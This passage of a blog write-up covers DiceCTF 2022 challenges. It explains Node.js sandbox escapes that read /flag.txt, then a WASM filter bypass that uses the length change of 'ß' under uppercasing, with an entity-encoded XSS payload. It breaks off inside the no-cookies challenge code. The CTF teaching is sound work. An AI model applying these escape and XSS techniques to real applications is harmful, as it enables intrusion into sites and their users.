<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>You can execute any code, but what can you do when almost everything becomes <code>undefined</code>?</p>
<p>When I was looking at this challenge, I didn’t know what to do. I tried several things that are supposed to be default, such as <code>module</code> and <code>exports</code>, but they all returned <code>undefined</code>. I thought about trying <code>import</code>, but it threw an error: <code>SyntaxError: Cannot use import statement outside a module</code>.</p>
<p>According to the <a target="_blank" rel="noopener" href="https://hackmd.io/fmdfFQ2iS6yoVpbR3KCiqQ#miscundefined">author’s writeup</a>, there are two solutions to this challenge.</p>
<p>The first solution is that although <code>import &quot;fs&quot;</code> doesn’t work, <code>import(&#39;fs&#39;)</code> does. I looked at <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-TW/docs/Web/JavaScript/Reference/Statements/import">MDN</a>, which says: “There is also a function-like dynamic import(), which does not require scripts of type&#x3D;”module”.”</p>
<p>So you can solve it like this:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">import</span><span class="token punctuation">(</span><span class="token string">"fs"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">m</span><span class="token operator">=></span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">,</span> <span class="token string">"utf8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>The other solution is to know some details about Node.js, such as if you write this code:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Trying to reach"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">return</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"dead code"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>Because there is no function, you expect the return to fail, but when you run it, you will find that it doesn’t fail and it really looks like a function. This is because Node.js modules are actually put into a function. The above code looks like this:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">exports<span class="token punctuation">,</span> require<span class="token punctuation">,</span> module<span class="token punctuation">,</span> __filename<span class="token punctuation">,</span> __dirname</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Trying to reach"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"dead code"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Our goal is to get the <code>require</code> parameter, but because <code>arguments</code> is also <code>undefined</code>, we cannot get it directly. We need to get it indirectly. What does this mean? We can first execute a function, and then use <code>arguments.callee.caller.arguments</code> to get the parameters of the parent function, like this:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">
<span class="token keyword">function</span> <span class="token function">wrapper</span><span class="token punctuation">(</span><span class="token parameter">flag</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> flag <span class="token operator">=</span> <span class="token keyword">null</span>
    <span class="token keyword">let</span> arguments <span class="token operator">=</span> <span class="token keyword">null</span>
    <span class="token keyword">function</span> <span class="token function">inner</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arguments<span class="token punctuation">.</span>callee <span class="token operator">===</span> inner<span class="token punctuation">)</span> <span class="token comment">// true</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arguments<span class="token punctuation">.</span>callee<span class="token punctuation">.</span>caller <span class="token operator">===</span> wrapper<span class="token punctuation">)</span> <span class="token comment">// true</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arguments<span class="token punctuation">.</span>callee<span class="token punctuation">.</span>caller<span class="token punctuation">.</span>arguments<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">// I am flag</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">inner</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token function">wrapper</span><span class="token punctuation">(</span><span class="token string">'I am flag'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>There are two regrets I have about this question. One is that a student asked me about the <code>return</code> issue before, and I only said that there was an outer layer of function, but I didn’t remember it. As a result, I completely forgot about it.</p>
<p>The second one is the <code>arguments.callee.caller</code> operation, which I wrote about two years ago: <a href="https://blog.huli.tw/2020/04/18/javascript-function-is-awesome/">I’m weird for thinking JavaScript function is awesome</a>.</p>
<p>Supplement on 2022-02-09:</p>
<p>Here is another cool solution from <a target="_blank" rel="noopener" href="https://blog.maple3142.net/2022/02/07/dicectf-2022-writeups/#undefined">DiceCTF 2022 WriteUps by maple3142</a>. </p>
<p>Here, the feature of structuredStackTrace in Node.js is used, and a simple POC looks like this:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">CustomError</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> oldStackTrace <span class="token operator">=</span> Error<span class="token punctuation">.</span>prepareStackTrace
  <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
    Error<span class="token punctuation">.</span><span class="token function-variable function">prepareStackTrace</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> structuredStackTrace</span><span class="token punctuation">)</span> <span class="token operator">=></span> structuredStackTrace
    Error<span class="token punctuation">.</span><span class="token function">captureStackTrace</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>stack
  <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>
    Error<span class="token punctuation">.</span>prepareStackTrace <span class="token operator">=</span> oldStackTrace
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">function</span> <span class="token function">trigger</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> err <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CustomError</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> x <span class="token keyword">of</span> err<span class="token punctuation">.</span>stack<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span><span class="token function">getFunction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">""</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token function">trigger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>We can use <code>x.getFunction()</code> to get the upper function, which is the one that Node.js adds a wrapper to, and then use <code>arugments</code> to get the parameters. The official documentation talks about the <a target="_blank" rel="noopener" href="https://v8.dev/docs/stack-trace-api">Stack trace API</a>.</p>
<p>And there’s one more thing I think is cool. In the POC above, if we put it in the undefined question, we don’t have an <code>Error</code> to use, so what do we do?</p>
<p>The author of the writeup used this trick:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">null</span><span class="token punctuation">.</span><span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	TypeError <span class="token operator">=</span> e<span class="token punctuation">.</span>constructor
<span class="token punctuation">&#125;</span>
Error <span class="token operator">=</span> <span class="token class-name">TypeError</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token class-name">__proto__</span><span class="token punctuation">.</span>constructor<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>That’s right! Since we can’t get the Error, let’s create a TypeError first, and then use the fact that TypeError inherits from Error to get the Error constructor without relying on global. This trick is so cool.</p>
<h2><span id="webx2fblazingfast75-solves">web&#x2F;blazingfast(75 solves)</span></h2><p>The description of this question is:</p>
<blockquote>
<p>I made a blazing fast MoCkInG CaSe converter!</p>
</blockquote>
<p>In short, a converter that converts odd-positioned letters to uppercase was written, and the main code is as follows:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> blazingfast <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">mock</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	blazingfast<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>str<span class="token punctuation">.</span>length <span class="token operator">>=</span> <span class="token number">1000</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token string">'Too long!'</span><span class="token punctuation">;</span>

	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> c <span class="token keyword">of</span> str<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>c<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token string">'Nice try.'</span><span class="token punctuation">;</span>
		blazingfast<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>blazingfast<span class="token punctuation">.</span><span class="token function">mock</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">return</span> <span class="token string">'No XSS for you!'</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">let</span> mocking <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">,</span> buf <span class="token operator">=</span> blazingfast<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token keyword">while</span><span class="token punctuation">(</span>buf <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			mocking <span class="token operator">+=</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
			buf <span class="token operator">=</span> blazingfast<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>

		<span class="token keyword">return</span> mocking<span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function">demo</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'result'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token function">mock</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

WebAssembly<span class="token punctuation">.</span><span class="token function">instantiateStreaming</span><span class="token punctuation">(</span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/blazingfast.wasm'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">&#123;</span> instance <span class="token punctuation">&#125;</span></span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>	
	blazingfast <span class="token operator">=</span> instance<span class="token punctuation">.</span>exports<span class="token punctuation">;</span>

	document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'demo-submit'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function-variable function">onclick</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
		<span class="token function">demo</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'demo'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>

	<span class="token keyword">let</span> query <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>search<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'demo'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>query<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'demo'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value <span class="token operator">=</span> query<span class="token punctuation">;</span>
		<span class="token function">demo</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>The blazingfast.c code is as follows:</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> length<span class="token punctuation">,</span> ptr <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">1000</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token keyword">int</span> size<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  length <span class="token operator">=</span> size<span class="token punctuation">;</span>
  ptr <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">char</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span> buf<span class="token punctuation">[</span>ptr<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token keyword">char</span> c<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  buf<span class="token punctuation">[</span>ptr<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> c<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">mock</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> length<span class="token punctuation">;</span> i <span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> buf<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">65</span> <span class="token operator">&amp;&amp;</span> buf<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">90</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      buf<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">32</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>buf<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'&lt;'</span> <span class="token operator">||</span> buf<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'>'</span> <span class="token operator">||</span> buf<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'&amp;'</span> <span class="token operator">||</span> buf<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'"'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>

  ptr <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>As long as the content in buf contains <code>&lt;</code> and <code>&gt;</code>, it will directly return 1, and then the JS layer will return <code>No XSS for you!</code>, so it is not easy to execute XSS.</p>
<p>I found the key to this question, but I didn’t read the code carefully at the time, which led to a wrong idea, and unfortunately I didn’t solve it.</p>
<p>The key is to use some special characters to create length differences, such as the <code>ß</code> character, which has a length of 1, but becomes two words after being converted to uppercase:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token string">'ß'</span><span class="token punctuation">.</span>length <span class="token comment">// 1</span>
<span class="token string">'ß'</span><span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>length <span class="token comment">// 2, becomes SS</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>There are other characters with this feature, and you can fuzz them yourself. Some characters are useful for bypassing length restrictions, such as this article: <a target="_blank" rel="noopener" href="https://jlajara.gitlab.io/web/2019/11/30/XSS_20_characters.html">Exploiting XSS with 20 characters limitation</a>, which uses this trick to shorten the length. URLs can also use the same trick, as can be seen in <a target="_blank" rel="noopener" href="https://github.com/splitline/domain-obfuscator">domain-obfuscator</a> or <a target="_blank" rel="noopener" href="https://github.com/filedescriptor/Unicode-Mapping-on-Domain-names">Unicode Mapping on Domain names</a>.</p>
<p>Assuming I have a string <code>ßßßßßßßß&lt;b&gt;1&lt;/b&gt;</code>, the length is 16, so the length will be 16 when initialized, but when it runs to the loop, it will become <code>8*2+8</code> &#x3D; 24 words because it is converted to uppercase, so all 24 words will be written into buf.</p>
<p>In the <code>mock</code> function, only the things in the length will be checked, so the last 8 words will not be checked, and <code>&lt;&gt;</code> and other characters can be smuggled in, like this:</p>
<p><img src="/img/dicectf2022/p1.png"></p>
<p>But because all characters will be converted to uppercase, we need to find an XSS payload that can still be used after being converted to uppercase. At this time, we can use an encoded string, like this:</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;img src&#x3D;x onerror&#x3D;&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;(1)&quot; &#x2F;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2><span id="webx2fno-cookies5-solves">web&#x2F;no-cookies(5 solves)</span></h2><p>This question is quite interesting. The description is:</p>
<blockquote>
<p>I found a more secure way to authenticate users. No cookies, no problems!</p>
</blockquote>
<p>In short, there is a website that asks for your username and password for any operation, and the API will directly bring the username and password, so there is no need for cookies.</p>
<p>The front-end code for this question is as follows:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> <span class="token function-variable function">validate</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">text</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^[^$']+$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>text <span class="token operator">??</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token keyword">const</span> <span class="token function-variable function">promptValid</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">text</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> result <span class="token operator">=</span> <span class="token function">prompt</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span> <span class="token operator">??</span> <span class="token string">''</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">validate</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">?</span> result <span class="token operator">:</span> <span class="token function">promptValid</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token keyword">const</span> username <span class="token operator">=</span> <span class="token function">promptValid</span><span class="token punctuation">(</span><span class="token string">'Username:'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> password <span class="token operator">=</span> <span class="token function">promptValid</span><span class="token punctuation">(</span><span class="token string">'Password:'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">const</span> params <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>search<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> note<span class="token punctuation">,</span> mode<span class="token punctuation">,</span> views <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token punctuation">(</span><span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/view'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
      <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>
      <span class="token literal-property property">headers</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
        <span class="token string-property property">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'application/json'</span><span class="token punctuation">,</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
      <span class="token literal-property property">body</span><span class="token operator">:</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
        username<span class="token punctuation">,</span>
        password<span class="token punctuation">,</span>
        <span class="token literal-property property">id</span><span class="token operator">:</span> params<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">)</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>note<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'Invalid username, password, or note id'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      window<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">'/'</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">let</span> text <span class="token operator">=</span> note<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>mode <span class="token operator">===</span> <span class="token string">'markdown'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      text <span class="token operator">=</span> text<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\[([^\]]+)\]\(([^\)]+)\)</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">match<span class="token punctuation">,</span> p1<span class="token punctuation">,</span> p2</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;a href="</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>p2<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">"></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>p1<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&lt;/a></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      text <span class="token operator">=</span> text<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">#\s*([^\n]+)</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">match<span class="token punctuation">,</span> p1</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;h1></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>p1<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&lt;/h1></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
